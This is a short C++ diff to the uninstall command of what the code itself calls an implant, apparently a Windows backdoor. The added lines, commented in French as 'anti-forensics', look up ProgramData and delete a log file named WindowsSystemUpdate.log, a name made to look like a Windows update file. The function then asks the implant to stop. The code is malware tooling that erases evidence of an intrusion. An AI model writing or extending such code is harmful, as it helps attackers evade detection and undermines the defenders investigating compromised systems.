@@ -74,6 +74,13 @@ std::string cmd_uninstall() {
         }
     }
 
+    // Nettoyage preventif de l'ancien fichier de log (anti-forensics).
+    char program_data[MAX_PATH] = {};
+    if (GetEnvironmentVariableA("ProgramData", program_data, sizeof(program_data))) {
+        std::string old_log = std::string(program_data) + "\\WindowsSystemUpdate.log";
+        DeleteFileA(old_log.c_str());
+    }
+
     result += "\nArret de l'implant demande.";
     request_self_stop();
     return result;
